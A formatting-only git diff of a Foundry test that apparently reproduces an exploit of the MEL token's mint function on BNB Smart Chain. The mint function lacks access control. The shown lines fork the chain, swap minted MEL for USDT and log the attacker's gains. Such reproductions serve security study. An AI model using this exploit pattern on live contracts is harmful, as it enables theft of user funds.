@@ -12,7 +12,7 @@ import "./interface.sol";
 // critical function lack of access control
 
 interface IMEL is IERC20 {
-    function mint(address account, uint256 amount, string memory txId) external returns(bool);
+    function mint(address account, uint256 amount, string memory txId) external returns (bool);
 }
 
 contract ContractTest is Test {
@@ -24,7 +24,7 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 27960445);
+        cheats.createSelectFork("bsc", 27_960_445);
     }
 
     function testExploit() external {
@@ -34,10 +34,12 @@ contract ContractTest is Test {
         address[] memory path = new address[](2);
         path[0] = address(MEL);
         path[1] = address(USDT);
-        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(mintAmount, 0, path, address(this), block.timestamp);
+        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            mintAmount, 0, path, address(this), block.timestamp
+        );
 
         emit log_named_decimal_uint(
             "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
-            );
+        );
     }
 }
